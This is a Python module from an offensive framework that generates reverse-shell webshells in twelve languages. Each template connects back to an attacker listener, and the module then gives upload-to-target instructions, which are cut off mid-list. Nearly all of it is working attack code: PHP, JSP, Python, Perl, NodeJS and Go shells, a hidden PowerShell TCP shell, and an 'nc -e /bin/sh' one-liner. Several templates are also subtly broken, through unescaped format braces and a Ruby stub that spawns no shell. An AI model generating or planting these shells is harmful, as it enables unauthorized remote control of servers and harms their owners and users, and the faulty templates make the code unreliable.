# modules/payload/web/universal_webshell_v2.py
import os, random, textwrap
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax
from rich.markdown import Markdown

console = Console()

MODULE_INFO = {
    "name": "Universal WebShell v2 (12 Languages)",
    "description": "PHP, ASP, ASPX, JSP, Python, Ruby, Perl, GO, JAVA, NodeJS, Netcat, Python2",
    "author": "LazyFramework",
    "platform": "multi",
    "arch": "multi",
    "rank": "Godlike"
}

OPTIONS = {
    "LHOST": {"description": "Listener IP", "required": True, "default": "192.168.1.100"},
    "LPORT": {"description": "Listener Port", "required": True, "default": 4444},
    "TYPE": {"description": "Shell type", "required": True, "default": "php",
             "choices": ["php", "asp", "aspx", "jsp", "python", "python2", "ruby", "perl", "go", "java", "nodejs", "netcat"]},
    "FILENAME": {"description": "Output filename (without ext)", "required": False, "default": "shell"}
}

# === TEMPLATES (12 Bahasa) ===
TEMPLATES = {
    # 1. PHP
    "php": {
        "ext": "php",
        "syntax": "php",
        "code": '''<?php
// PHP Reverse Shell
set_time_limit(0);
$ip = '{LHOST}'; $port = {LPORT};
$s = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', [0=>$s,1=>$s,2=>$s], $pipes);
?>
'''
    },

    # 2. ASP
    "asp": {
        "ext": "asp",
        "syntax": "asp",
        "code": '''<%
Set shell = CreateObject("WScript.Shell")
shell.Exec("cmd.exe /c powershell -nop -w hidden -c $client = New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$stream.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> '; $sbyte=([Text.Encoding]::ASCII).GetBytes($sb2);$stream.Write($sbyte,0,$sbyte.Length);$stream.Flush()}};$client.Close()")
%>
'''
    },

    # 3. ASPX
    "aspx": {
        "ext": "aspx",
        "syntax": "csharp",
        "code": '''<%@ Page Language="C#" %>
<script runat="server">
void Page_Load() {
    System.Net.Sockets.TcpClient c = new System.Net.Sockets.TcpClient("{LHOST}", {LPORT});
    System.IO.Stream s = c.GetStream();
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardInput = true;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    byte[] b = new byte[1024];
    while (true) {
        int r = s.Read(b, 0, b.Length);
        if (r <= 0) break;
        string cmd = System.Text.Encoding.ASCII.GetString(b, 0, r);
        p.StandardInput.WriteLine(cmd);
    }
}
</script>
'''
    },

    # 4. JSP
    "jsp": {
        "ext": "jsp",
        "syntax": "java",
        "code": '''<%@page import="java.io.*,java.net.*"%>
<% Socket s = new Socket("{LHOST}", {LPORT}); Process p = Runtime.getRuntime().exec("cmd.exe"); InputStream pi = p.getInputStream(), si = s.getInputStream(); OutputStream po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); } p.destroy(); s.close(); %>
'''
    },

    # 5. Python 3
    "python": {
        "ext": "py",
        "syntax": "python",
        "code": '''#!/usr/bin/python3
import socket, subprocess, os
s = socket.socket(); s.connect(("{LHOST}", {LPORT}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''
    },

    # 6. Python 2
    "python2": {
        "ext": "py",
        "syntax": "python",
        "code": '''#!/usr/bin/python2
import socket, subprocess, os
s = socket.socket(); s.connect(("{LHOST}", {LPORT}))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''
    },

    # 7. Ruby
    "ruby": {
        "ext": "rb",
        "syntax": "ruby",
        "code": '''#!/usr/bin/ruby
require 'socket'
TCPSocket.open("{LHOST}", {LPORT}) { |s| s.puts "/bin/sh -i" }
'''
    },

    # 8. Perl
    "perl": {
        "ext": "pl",
        "syntax": "perl",
        "code": '''#!/usr/bin/perl
use IO::Socket;
$s = IO::Socket::INET->new(PeerAddr=>"{LHOST}", PeerPort=>{LPORT}, Proto=>'tcp');
open(STDIN,"<&".$s); open(STDOUT,">&".$s); open(STDERR,">&".$s);
exec("/bin/sh -i");
'''
    },

    # 9. Go (CGI)
    "go": {
        "ext": "cgi",
        "syntax": "go",
        "code": '''#!/usr/bin/env go run
package main
import "net"; import "os/exec"; import "os"
func main() {
    c, _ := net.Dial("tcp", "{LHOST}:{LPORT}")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
    cmd.Run()
}
'''
    },

    # 10. Java (Servlet)
    "java": {
        "ext": "java",
        "syntax": "java",
        "code": '''import java.net.*; import java.io.*; public class R {{
    public static void main(String[] args) throws Exception {{
        Socket s = new Socket("{LHOST}", {LPORT});
        Process p = Runtime.getRuntime().exec("cmd.exe");
        new Thread(() -> {{ try {{ InputStream pi = p.getInputStream(), si = s.getInputStream(); OutputStream po = p.getOutputStream(), so = s.getOutputStream(); byte[] b = new byte[1024]; int n; while ((n = si.read(b)) > 0) po.write(b, 0, n); while ((n = pi.read(b)) > 0) so.write(b, 0, n); }} catch (Exception e) {{}} }}).start();
    }}
}}
'''
    },

    # 11. NodeJS
    "nodejs": {
        "ext": "js",
        "syntax": "javascript",
        "code": '''const net = require('net');
const cp = require('child_process');
const sh = cp.spawn('/bin/sh', []);
const client = new net.Socket();
client.connect({LPORT}, '{LHOST}', () => {{
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
}});
'''
    },

    # 12. Netcat (bash one-liner)
    "netcat": {
        "ext": "sh",
        "syntax": "bash",
        "code": '''#!/bin/bash
# Netcat Reverse Shell
nc -e /bin/sh {LHOST} {LPORT}
'''
    }
}

def run(session, options):
    lhost = options["LHOST"]
    lport = int(options["LPORT"])
    shell_type = options["TYPE"].lower()
    filename = options.get("FILENAME", "shell")

    if shell_type not in TEMPLATES:
        console.print(f"[red]Invalid TYPE. Available: {', '.join(TEMPLATES.keys())}[/red]")
        return

    tpl = TEMPLATES[shell_type]
    code = tpl["code"].format(LHOST=lhost, LPORT=lport)
    ext = tpl["ext"]
    syntax_lang = tpl["syntax"]

    # Save
    save_dir = Path("webshells")
    save_dir.mkdir(exist_ok=True)
    final_filename = f"{filename}.{ext}"
    filepath = save_dir / final_filename
    filepath.write_text(code)

    # Make executable if needed
    if ext in ["py", "rb", "pl", "cgi", "sh"]:
        filepath.chmod(0o755)

    # Syntax
    syntax = Syntax(
        code,
        syntax_lang,
        theme="monokai",
        line_numbers=True,
        indent_guides=True,
        background_color="#1e1e1e"
    )

    # Panel
    editor = Panel(
        syntax,
        title=f"[bold magenta]Universal WebShell v2[/] - [cyan]{shell_type.upper()}[/] - [yellow]{final_filename}[/]",
        subtitle=f"[green]Saved:[/] {filepath}  |  [bold]Copy[/]  [blue]Download[/]",
        border_style="bright_cyan",
        padding=(1, 2)
    )

    # Instructions
    access = f"http://target.com/{final_filename}"
    if ext in ["cgi", "sh"]:
        access = f"http://target.com/cgi-bin/{final_filename}"

    instructions = Markdown(f"""
### How to Use:
1. **Upload** `{final_filename}` → `{access}`
2. **Start listener**:
